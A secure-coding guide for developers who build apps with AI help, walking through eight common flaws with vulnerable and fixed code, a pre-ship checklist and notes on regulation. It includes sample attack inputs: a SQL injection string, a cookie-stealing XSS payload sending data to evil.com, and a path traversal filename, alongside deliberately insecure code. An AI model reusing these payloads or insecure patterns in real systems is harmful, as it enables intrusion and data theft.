# The Vibe Coder's Security Playbook: What Will Break Your App

### Why This Exists

You shipped an app. Or you're about to. The code works—you tested it, the AI tested it (sort of), it does the thing.

Here's what nobody told you: there are eight ways your AI just baked a security hole into your code, and none of them will show up in your tests. They'll show up the day someone scrapes your repo, the day a user pastes `' OR 1=1 --` into a form, the day a regulator emails you about CRA, or the day a script kiddie finds your hardcoded OpenAI key on GitHub.

This guide teaches you how to find them. No security background needed. The fixes are concrete; the failures are visible once you know what to look for.

**The regulatory angle, briefly.** The **EU Cyber Resilience Act (CRA)** applies from late 2027 to anyone shipping software products into the EU—including indie devs. **NIST SSDF** (the standard the US Executive Order 14028 spawned) is the de facto US baseline; cyber insurers and enterprise B2B procurement already require it. Both regulations are converging on the same secure-development practice set. You don't need to read either of them today. But you do need to write code that won't humiliate you when one applies.

**Companion reads:** *The Hidden Rules of Clean, Scalable Code* (the principles) and *The Vibe Coder's Quality Playbook* (how to enforce them with AI). This guide assumes you can read code; it doesn't assume you can spot a vulnerability.

---

### The AI-Security Failure Mode

The same family that haunts the other two guides is most dangerous here.

> **The AI produces output that satisfies the SHAPE of the security practice without delivering the SUBSTANCE.**

You asked for "authentication." It produced a `login()` function that sets a cookie. ✓ shape. Does it actually verify the password? Does the cookie expire? Is it `HttpOnly`? Is the token random or guessable? ✗ substance.

You asked for "password hashing." It produced `hashlib.md5(password).hexdigest()`. ✓ shape (it's a hash). MD5 broken since the 1990s, reversible with a $5 GPU rental, no salt, no work factor. ✗ substance.

You asked for "input validation." It produced `if name:`. ✓ shape (it checks something). Doesn't constrain type, length, character set, or special characters. ✗ substance.

**The detection skill:**
> *"What's the substantive security property this practice is for? Is the output delivering it, or just matching its shape?"*

Burn that question in. Every security pattern in the rest of this guide is an instance of asking it.

---

### The Top Failures AI Generates Confidently

Eight patterns. AI produces every one of them without flagging anything. Each has a before/after.

#### 1. Hardcoded Secrets

AI loves to inline API keys, database passwords, and tokens because it makes "complete examples" actually run. The example then ships. The key ends up on GitHub. Scrapers find it within minutes.

```python
# ❌ Before (AI's first draft)
OPENAI_API_KEY = "sk-proj-AbCdEf..."
DB_PASSWORD = "admin123"
JWT_SECRET = "super-secret-string"

# ✅ After
import os
OPENAI_API_KEY = os.environ["OPENAI_API_KEY"]
DB_PASSWORD = os.environ["DB_PASSWORD"]
JWT_SECRET = os.environ["JWT_SECRET"]
# .env file (in .gitignore — verify!)
```

**Verify the fix:** Search your git history. `git log -p | grep -iE "sk-|ghp_|AKIA|password ?=|api_key ?="`. If anything matches, **rotate those keys now**—being in history is being public.

#### 2. SQL Injection

The AI's training data is full of string-concatenated queries. It generates them confidently. They look fine. They're not.

```python
# ❌ Before
query = f"SELECT * FROM users WHERE email = '{user_email}'"
db.execute(query)

# Attack: user_email = "x' OR 1=1 --"  → returns every user

# ✅ After (parameterized)
db.execute("SELECT * FROM users WHERE email = ?", (user_email,))

# Or with an ORM:
User.query.filter_by(email=user_email).first()
```

**Verify:** grep your code for `f"SELECT` `f"INSERT` `f"UPDATE` `"SELECT " +` and friends. Every match is SQL injection until proven safe.

#### 3. XSS via Direct HTML Injection

The browser equivalent of SQL injection. AI generates `innerHTML` patterns because they're shorter than the safe alternatives.

```javascript
// ❌ Before
element.innerHTML = userMessage;
// or React:
<div dangerouslySetInnerHTML={{__html: userMessage}} />

// Attack: userMessage = "<script>fetch('https://evil.com?c='+document.cookie)</script>"

// ✅ After
element.textContent = userMessage;  // text, not HTML
// or React:
<div>{userMessage}</div>  // React auto-escapes
```

**Verify:** grep `innerHTML` `dangerouslySetInnerHTML` `document.write` `eval(`. Each one is an XSS hole until you can prove the input is fully sanitized.

#### 4. Missing Input Validation at the Boundary

AI accepts any input you give it without asking "what if the input is hostile?" This is the same pattern from the Quality Playbook, but now the hostile input is a real attacker.

```python
# ❌ Before
@app.post("/upload")
def upload(filename, content):
    open(f"/uploads/{filename}", "w").write(content)
# Attack: filename = "../../etc/passwd"  → path traversal

# ✅ After
import os, re
@app.post("/upload")
def upload(filename, content):
    if not re.match(r"^[\w.-]+$", filename):
        raise ValueError("invalid filename")
    safe_path = os.path.join("/uploads", os.path.basename(filename))
    if not safe_path.startswith("/uploads/"):
        raise ValueError("invalid path")
    open(safe_path, "w").write(content)
```

**Rule:** every input from a user (form, URL parameter, file upload, header, API call) is **adversarial until validated**. Validate type, range, format, character set.

#### 5. Open CORS

The "make it work locally" CORS config that ships to production.

```javascript
// ❌ Before
app.use(cors({
  origin: '*',
  credentials: true,  // CATASTROPHIC with origin: '*'
}));

// ✅ After
app.use(cors({
  origin: ['https://your-app.com', 'https://www.your-app.com'],
  credentials: true,
}));
```

**Why it matters:** `origin: '*'` with `credentials: true` means any website on the internet can make authenticated requests to your API as your logged-in user. Browsers used to allow this until they realized how bad it was.

#### 6. Insecure Defaults Shipped to Production

Debug mode in prod. Stack traces shown to users. Default admin credentials. Verbose error messages leaking your tech stack and table names.

```python
# ❌ Before (in production)
DEBUG = True
@app.errorhandler(Exception)
def handle(e):
    return f"Error: {e}\n{traceback.format_exc()}", 500

# ✅ After
DEBUG = os.environ.get("DEBUG", "false").lower() == "true"  # false by default
@app.errorhandler(Exception)
def handle(e):
    logger.exception(e)  # log it internally
    return "Internal server error", 500  # generic message to user
```

**Verify:** in production, trigger an error and check the response. If you see a stack trace, a SQL query, or a file path, your defaults are leaking.

#### 7. Cryptography Misuse

AI confidently uses broken or misused crypto because the broken patterns are well-represented in training data.

```python
# ❌ Before (passwords)
hashed = hashlib.md5(password.encode()).hexdigest()
# MD5 reversible in seconds. SHA1 same problem. Plain SHA256 lacks salt + work factor.

# ✅ After
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# Or argon2 (newer, stronger)
```

```python
# ❌ Before (encryption)
cipher = AES.new(key, AES.MODE_ECB)  # ECB leaks patterns
encrypted = cipher.encrypt(pad(data))
# Or with a hardcoded IV — same plaintext always produces same ciphertext

# ✅ After
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
aesgcm = AESGCM(key)
nonce = os.urandom(12)  # fresh nonce every time
encrypted = aesgcm.encrypt(nonce, data, associated_data=None)
```

**Rule of thumb:** if you find yourself implementing crypto, you're already wrong. Use a vetted library (`bcrypt`/`argon2` for passwords, `cryptography`/`libsodium` for everything else). Never roll your own.

#### 8. Trust Boundary Confusion

Treating data as trusted because it "came from your app"—when it actually came from a client *the user controls*.

```javascript
// ❌ Before — trusting hidden form fields, client-side validation only
<input type="hidden" name="user_role" value="user">
<form onsubmit="if (price >= 0) submit()">  // client-side only

// Attacker: opens DevTools, changes user_role to "admin", sets price to -100
```

```javascript
// ✅ After — re-validate everything server-side
// Server NEVER trusts hidden fields, client-side validation, or
// anything else the client could modify. Re-derive user_role from
// the session/JWT on the server. Re-validate price server-side.
```

**Rule:** the only thing your server can trust is what your *server* knows. Cookies you signed. Session data you stored. Tokens you issued and can verify. Everything else is user-controlled.

---

### The "Did the AI Just Generate This?" Gut Check

Some categories of code deserve a second look every time the AI produces them. Train this reflex.

| Category | Why look twice |
|---|---|
| Anything with `password`, `token`, `secret`, `key`, `session` | High blast radius on failure |
| Anything that constructs a SQL query | Default-unsafe with string concat |
| Anything with `innerHTML`, `eval`, `exec`, `subprocess(shell=True)` | One mistake = code execution |
| Anything with file paths from user input | Path traversal until proven safe |
| Anything labeled "// quick fix" or "// TODO: real validation later" | "Later" never comes |
| Anything with `crypto`, `hash`, `random()` for security | Crypto misuse is easy + invisible |
| Anything with CORS, CSP, cookie config | One flag wrong = entire class of attacks |
| Anything that touches authn/authz | The bug here is the breach |

**Pattern:** the higher the consequences, the longer the second look.

---

### The Pre-Ship Security Checklist

Concrete steps. Each one is doable in 5-10 minutes with no security background. Do them all before you ship.

1. **Search for embedded secrets.** Run:
   ```
   git log -p | grep -iE "sk-|ghp_|AKIA|password ?= ?['\"]|api_key ?= ?['\"]"
   ```
   Anything in history is public. Rotate it.

2. **Confirm `.env` is in `.gitignore`.** Check `.gitignore`. Then `git ls-files | grep .env` to confirm none are tracked.

3. **Audit SQL queries.** Grep for `f"SELECT` `"SELECT " +` `f"INSERT` `f"UPDATE` `f"DELETE`. Every match = SQL injection until parameterized.

4. **Audit HTML injection.** Grep for `innerHTML` `dangerouslySetInnerHTML` `document.write` `eval(`. Each = XSS until safe input is proven.

5. **Audit input handlers.** For every form / API endpoint, ask: does it validate type, length, format, character set? If not, add validation.

6. **Try to be another user.** Open your app in two browsers, log in as different users. Try to access user A's data while logged in as user B (modify URLs, modify cookies, modify form fields). If you succeed, your auth is broken.

7. **Audit password hashing.** Grep `md5` `sha1` `sha256` near `password`. If found and used for passwords, replace with `bcrypt` or `argon2`.

8. **Run a dependency audit.** `npm audit` / `pip-audit` / `cargo audit`. Fix anything HIGH or CRITICAL. Note the rest.

9. **Disable debug in production.** Verify `DEBUG=False` (or equivalent) ships. Trigger an error in prod—if you see a stack trace, fix it.

10. **CORS sanity check.** If your API has CORS, the origin list is explicit (no `*` with credentials).

Done. You've closed the most common vulnerabilities AI introduces. Not all vulnerabilities—but the ones that account for ~80% of indie-dev breaches.

---

### Two Tiers: With Tools and Without

Same scaffolding as the Quality Playbook—match your discipline to your stage.

**Tier 0 — Bare Discipline:**
- Pre-Ship Security Checklist above
- "All user input is adversarial" mindset
- DevTools as your security tester: try modifying requests, cookies, form fields—see what breaks
- When AI generates anything in the "look twice" categories, look twice

**Tier 1 — Editor + Scanners:**
- **Secret detection:** `gitleaks` or `trufflehog` as pre-commit hook
- **Static analysis:** `bandit` (Python), `eslint-plugin-security` (JS), `gosec` (Go), `cargo audit` (Rust)
- **Dependency scanning:** `npm audit` / `pip-audit` / `cargo audit` in CI
- **HTTPS only:** redirect HTTP → HTTPS; mark cookies `Secure` and `HttpOnly`

**Tier 2 — Full Security Stack:**
- **SAST in CI:** Semgrep, CodeQL
- **DAST:** OWASP ZAP, Burp Suite (against staging)
- **SBOM generation:** `syft`, `cyclonedx-bom`
- **Vulnerability disclosure process:** `SECURITY.md`, security email, response SLA
- **CSP, HSTS, security headers:** `helmet.js` or equivalent
- **This is where compliance pipelines fit** — see "When You Outgrow This Guide" below

Move up tiers when the lower one isn't enough. Don't skip tiers—each one builds the discipline you need at the next.

---

### The CRA Reality (Brief)

The **EU Cyber Resilience Act** applies from late 2027. If you ship software products that end up in the hands of EU users, you're subject to it.

**What it actually requires:**
- Security throughout the product lifecycle (no shipping and forgetting)
- SBOM (Software Bill of Materials)
- Vulnerability handling process (way to receive reports, fix them, ship updates)
- Free security updates for the support period you declared
- CE marking for software products in scope

**What it actually means for you:**
- "I'm just a small indie dev" is not a defense
- Liability is real—non-compliance penalties can exceed €15M or 2.5% global turnover
- You can't outsource the obligation; you're the manufacturer

**The US side:** **NIST SSDF** (driven by **Executive Order 14028**) is the de facto secure-development baseline. Even without federal customers, cyber insurers and enterprise B2B procurement increasingly require SSDF attestation.

**The reassuring part:** if you've done the Pre-Ship Checklist above and you're running at least Tier 1, you're 60% of the way to CRA/SSDF compliance. The remaining 40% is documentation, attestation, and process—not net-new security work.

---

### When You Outgrow This Guide

Signs you've outgrown this guide:
- You have paying customers
- You ship to EU users
- You have federal contracts (or want them)
- You have enterprise B2B contracts that ask for SSDF attestation
- A cyber insurer asked you for security documentation
- A customer asked for an SBOM

Next steps:

1. **Get a real security review.** Once a year minimum. Pen test if you're handling sensitive data.
2. **Adopt a conformity-assessment pipeline.** Something that maps your evidence to CRA/SSDF practice groups, produces traffic-light verdicts, signs evidence bundles, and gives you the artifacts auditors and regulators want.

For (2): see `holbizmetrics/conformity-pipeline` for an open-source implementation. It unifies CRA Annex I + EO 14028/SSDF + license compliance + functional correctness + operational resilience into one evidence pipeline with one verdict and N report renderings (per stakeholder).

The conformity-pipeline is the **production tool**. This guide is the **mindset and habits** that make you ready to use one.

---

### Closing

Most vibe-coded security incidents look the same in retrospect: a hardcoded key, a string-concat query, an `innerHTML` from user input, a missing validation. None of them required sophisticated attackers; they required *no* attackers, because the code shipped vulnerable and someone trivial found it.

The Pre-Ship Checklist closes those holes. The "look twice" reflex catches the next batch. The Tier progression takes you from "I tried" to "I can prove it" when regulators or customers ask.

You don't have to become a security engineer. You have to refuse to ship the eight failures listed above. That's the difference between "vibe-coded app" as a joke and "vibe-coded app" as a product.

**Companion reads:**
- *The Hidden Rules of Clean, Scalable Code* — the principles
- *The Vibe Coder's Quality Playbook* — how to enforce them with AI
- `holbizmetrics/conformity-pipeline` — the production-grade compliance tool
